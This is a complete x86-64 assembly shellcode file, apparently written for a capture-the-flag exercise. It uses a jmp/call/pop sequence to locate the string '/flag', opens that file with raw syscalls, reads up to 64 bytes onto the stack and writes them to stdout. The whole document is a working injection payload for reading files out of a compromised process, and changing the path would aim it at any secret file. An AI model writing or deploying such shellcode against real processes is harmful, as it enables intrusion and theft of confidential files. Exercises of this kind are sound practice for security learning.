BITS 64
global _start
_start:
    jmp loadstring
file_read:
    pop rdi
    xor rax,rax
    mov rsi,rax
    mov rdx,rax
    mov al,0x2
    syscall

    mov rdi,rax
    mov rsi,rsp
    mov dl,0x40
    xor rax,rax
    syscall

    xchg rax,rdx
    mov dil,0x1
    mov al,0x1
    syscall

    ret
loadstring:
    call file_read
    db "/flag",0
